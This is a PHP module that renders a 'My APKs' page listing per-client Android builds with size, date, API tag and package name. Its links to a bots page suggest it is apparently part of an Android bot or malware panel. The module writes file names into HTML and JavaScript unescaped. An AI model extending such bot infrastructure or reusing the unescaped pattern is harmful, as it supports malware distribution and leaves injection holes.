<?php
require_once "cmd_mod.php";

class apks extends modBase
{
	protected $module_name = 'apks';

	function get_content()
	{
		$path = dirname(__FILE__) . "/../../../apks/";
		$aapt_path = dirname(__FILE__) . "/../aapt/";
		
		$total = 0;
		$sorted = array();

		foreach(glob("{$path}/{$this->client_cfg['db_user']}*.apk") as $file)
		{
			$total++;
			$time = filectime($file);
			
			if(array_key_exists($time, $sorted))
				$sorted[$time][] = $file;
			else
				$sorted[$time] = array($file);
		}
		
		ksort($sorted);
		$sorted = array_reverse($sorted, true);
		
		$content = "
		<div class='row'>
			<div class='col-md-12' style='font-size: 32pt; text-align: center'>
				<span class='glyphicon glyphicon-download-alt marginRight10' aria-hidden='true'></span>
				My APKs</div>
		</div>
		<div>&nbsp;</div>
		
		<table class='table table-bordered' style='background-color: #eee; text-align: center'>
		<tr>
			<th style='width: 100px'>Link</th>
			<th style='width: 100px'>Size</th>
			<th style='width: 100px'>Build date</th>
			<th style='width: 100px'>API</th>
			<th>Template name</th>
			<th>Package</th>
		</tr>
		";
		
		foreach($sorted as $f_time=>$files)
		{
			foreach($files as $file)
			{
				$size = hlp::human_filesize(filesize($file));
				$time = hlp::human_date($f_time);
				
				$parts = explode("_", substr($file, 0, strlen($file)-4));

				$desc = str_replace("-", " ", $parts[2]); //client_theme-theme_00.00.00.apk
				$api = $parts[3];

				$date = str_replace('.', '', substr($api, 0, 8));
				$api_clean = $date . substr($api, 8);
				
				$pkg = hlp::get_package_name($file, $aapt_path);
				
				$file_name = array_pop(explode('/', $file));
				$content .= "
				<tr>
					<td style='width: 100px;'><button type='button' class='btn btn-info' onclick='download_apk(\"{$file_name}\")'>Download</button></td>
					<td style='width: 100px'>{$size}</td>
					<td style='width: 100px'>{$time}</td>
					<td style='width: 100px'><a href='#page:menu-bots;bots-filter-tag={$api_clean}' title='Filter by Tag'>{$api_clean}</a></td>
					<td>{$desc}</td>
					<td style='font-style: italic; color: darkblue'>{$pkg}</td>
				</tr>";
			}
		}
		
		$content .= "</table>";

		return $this->wrap_content("Total: {$total}", $content);
	}
}



